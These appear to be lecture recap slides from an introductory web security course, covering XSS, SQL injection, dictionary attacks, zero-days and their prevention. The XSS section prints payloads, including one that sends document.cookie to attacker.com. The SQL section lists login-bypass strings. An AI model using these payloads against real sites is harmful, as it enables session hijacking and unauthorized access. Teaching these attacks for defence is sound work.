Recap from Week 5
(delivered at Week 6)


Never trust user input!
This is the golden rule to prevent many attacks.

Hackers & Their Intent:
- Black-Hat:
Malicious intent, no permission (e.g., stealing data).

- White-Hat:
Ethical hackers with permission (e.g., penetration testing).

- Gray-Hat:
Good intent but no permission (e.g., hacking to expose flaws).


Penetration Testing
Simulated attacks to find vulnerabilities

- Authorized & Legal.
- Mimics Real Attacks.
- Provides Fixes.


Bug Bounty Programs
Rewards for finding vulnerabilities.
Read Rules First.


Exploit is a software, code, or a technique
that takes advantage of a vulnerability.

https:www.exploit-db.com/
https:www.cvedetails.com/


Zero-Day Exploits
Unknown vulnerabilities with no patch yet.
The most dangerous!

Famous Zero-Day Exploits

- WannaCry (2017) Ransomware encrypted 200,000+
- SolarWinds (2020) compromised software updates
- Log4Shell (2021) remote code execution via text

Protection Measures

- Update software regularly.
- Use security tools (EDR/XDR).
- Sanitize all user inputs.
- Limit attack surface.


Cookies
A small data (hash) stored in your browser.

- Login sessions
- Preferences
- Tracking

Cookies can be stolen via XSS
and attackers can impersonate users.



XSS (Cross-Site Scripting)

Occurs when an attacker injects
malicious scripts into a web application.

Possible if you use .innerHTML
with not sanitized user input.


Malicious input:

<img src='fake' onerror='alert("You are hacked now!")'>
<a href="javascript:alert('You are hacked again!')">Click me</a>
<img src='x' onerror=
'fetch("https://attacker.com/steal
?cookie_stolen="+encodeURIComponent(document.cookie))'>

Prevention

- Use `textContent`
- Sanitize input with JS
- Add CSP header:
<meta http-equiv="Content-Security-Policy"
content="default-src 'self'">


Form Validation Bypass

Client-side validation can be easily bypassed.
Rely only on backend validation.

Dictionary Attacks

Using precomputed hashes to crack passwords.

Example:

123456:    e10adc3949ba59abbe56e057f20f883e
password:  5f4dcc3b5aa765d61d8327deb882cf99
qwerty:    d8578edf8458ce06fbc5bb76a58c5ca4
abc123:    e99a18c428cb38d5f260853678922e03
11111:     96e79218965eb72c92a549dd5a330112
foo:       d3b07384d113edec49eaa6238ad5ff00

https://hashes.com/en/decrypt/hash


SQL Injection

Injecting SQL code to manipulate databases.

- Bypass authentication.
- Steal, modify, or delete data in DB.
- Execute admin-level operations.

Example to bypass login:

' OR 1=1 --
admin' --

SELECT * FROM users
    WHERE username = 'admin' -- '
    AND password = '';

In SQL comment (--) tells to ignore
anything after it.


Prevention:

- Use parameterized queries
- sanitize inputs.

Remember:
Never trust user input!